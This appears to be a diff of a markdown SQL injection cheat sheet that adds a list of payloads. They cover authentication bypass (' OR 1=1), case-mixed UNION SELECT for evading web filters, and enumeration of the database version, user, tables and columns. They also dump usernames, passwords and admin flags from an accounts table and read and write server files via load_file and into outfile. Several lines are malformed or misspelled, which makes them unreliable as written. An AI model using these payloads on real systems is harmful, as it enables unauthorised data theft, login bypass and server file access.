@@ -3,7 +3,7 @@
 ### Summary:
 
 
-__Basic___
+__Basic__
 
 >> __' OR 1=1 ;--__ 
     
@@ -57,14 +57,39 @@ __Complex:__
 | __uNioN`/**/`sEleCt`/**/`1,2`/**/`%23__       &nbsp;&nbsp;  |  Bypass Web filters  | 
 
 
-| __union select 1, column_name, null, from Infromation_schema .columns where table_name = 0x769166__  &nbsp;&nbsp; | hex encoding                                                                                                                                dbname   
+
+>> UniOn selEct 1,version() /*
 
 
-| __' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts'__ | 
+>> UniOn selEct 1,database() /*
 
 
-| __' union select username, pass, is_admin from 'accounts'__ &nbsp;&nbsp;  | 
+>> UniOn selEct 1,user() /*
 
 
-| __' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb'__ |
+>> UniOn selEct 1,table_name frOm information_schema.tables table_schema = '[database name]' /*
+
+
+>> UniOn selEct 1,column_name frOm information_schema.columns table_name = '[table name]' /*
+
+
+>> UniOn selEct 1,[column name] frOm [table name] /*
+
+
+>> UniOn selEct 1,load_file('file location') /*   Reading files:
+
+
+>> UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*  Writing files 
+
+
+>> union select 1, column_name, null, from Infromation_schema .columns where table_name = 0x769166__  &nbsp;&nbsp; | hex encoding                                                                                                                                dbname   
+
+
+>>  __' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts'__ | 
+
+
+>>  __' union select username, pass, is_admin from 'accounts'__ &nbsp;&nbsp;  | 
+
+
+>> __' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb'__ |
 
